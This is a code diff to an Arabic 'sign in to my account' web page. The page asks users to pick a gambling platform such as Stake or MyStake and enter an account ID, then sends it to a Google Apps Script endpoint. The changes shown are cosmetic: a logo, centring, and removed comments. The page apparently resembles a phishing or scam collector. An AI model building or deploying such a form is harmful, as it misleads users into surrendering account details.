@@ -15,7 +15,7 @@
   .sysbar{position:fixed;top:0;left:0;right:0;height:env(safe-area-inset-top, 0px);background:#0052ff;z-index:10;pointer-events:none}
   .shell{max-width:400px;margin:0 auto;padding:calc(env(safe-area-inset-top, 0px) + 16px) 18px 24px}
   .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px}
-  .title{font-size:20px;font-weight:700;margin-bottom:16px}
+  .title{font-size:20px;font-weight:700;margin-bottom:16px;text-align:center}
   .group{margin-bottom:14px}
   .label{display:block;font-size:15px;font-weight:700;color:#0f172a;margin-bottom:8px}
   .field{width:100%;height:48px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink);font-size:15px;padding:0 12px;outline:none}
@@ -24,8 +24,6 @@
   .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
   .btn[disabled]{opacity:.6;cursor:not-allowed}
   .warn{font-size:12px;color:#444;line-height:1.7;margin-top:12px;text-align:center}
-
-  /* شاشة التحميل الأولية (ثلاث نقاط) */
   .initial-loading{
     position:fixed;
     inset:0;
@@ -49,8 +47,6 @@
     0%,80%,100%{transform:scale(0);}
     40%{transform:scale(1);}
   }
-
-  /* شاشة التحميل عند الضغط على تسجيل الدخول (دائرة دوارة) */
   .loading-screen{
     position:fixed;
     inset:0;
@@ -75,7 +71,6 @@
 
 <div class="sysbar"></div>
 
-<!-- التحميل الأولي -->
 <div class="initial-loading" id="initial-loading">
   <div class="dot"></div>
   <div class="dot"></div>
@@ -85,8 +80,13 @@
 <div id="app" style="display:none;">
   <div class="shell">
     <div class="card" id="login-card">
-      <div class="title">الدخول إلى حسابي</div>
 
+      <div style="text-align:center; margin-bottom:16px;">
+        <img src="https://i.postimg.cc/L8yrTWhj/file-000000005ebc61f4a84ec1ac4e2b389b-1.png" 
+             alt="Logo" style="width:90px; height:auto;">
+      </div>
+
+      <div class="title">الدخول إلى حسابي</div>
       <div class="group">
         <span class="label">حدد المنصة</span>
         <select id="platform" class="field">
@@ -116,15 +116,14 @@
       <div class="warn">
         بالضغط على زر المتابعة، أنت تؤكد أن عمرك 18 سنة فأكثر وأنك توافق على سياسة الخصوصية والشروط والأحكام.
       </div>
+
     </div>
   </div>
 </div>
 
-<!-- شاشة التحميل عند الضغط على تسجيل الدخول -->
 <div class="loading-screen" id="loading-screen">
   <div class="spinner"></div>
 </div>
-
 <script>
 const initialLoading = document.getElementById('initial-loading');
 const app = document.getElementById('app');
@@ -138,18 +137,14 @@ const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6n
 let platform = null;
 const repReg = /^(\d)\1{6,}$/;
 
-// إعادة تحميل الصفحة عند الرجوع للتأكد من إعادة تشغيل النموذج
 window.addEventListener('pageshow', (event) => {
   if (event.persisted || (window.performance && window.performance.getEntriesByType("navigation")[0].type === "back_forward")) {
     window.location.reload();
   }
 });
 
-// عرض الواجهة بعد التحميل الأولي
 window.addEventListener('load', ()=>{
   loadingScreen.style.display = "none";
-
-  // إعادة تعيين النموذج للحالة الأولية
   loginCard.style.display = "block";
   uid.value = "";
   platformSelect.value = "";
@@ -165,7 +160,6 @@ window.addEventListener('load', ()=>{
     app.style.display = 'block';
   }, 1000);
 });
-
 function validate() {
   let val = uid.value.trim();
   if(platform === "Stake" || platform === "MyStake"){
@@ -224,3 +218,4 @@ go.addEventListener('click', async () => {
 
 </body>
 </html>
+</body>
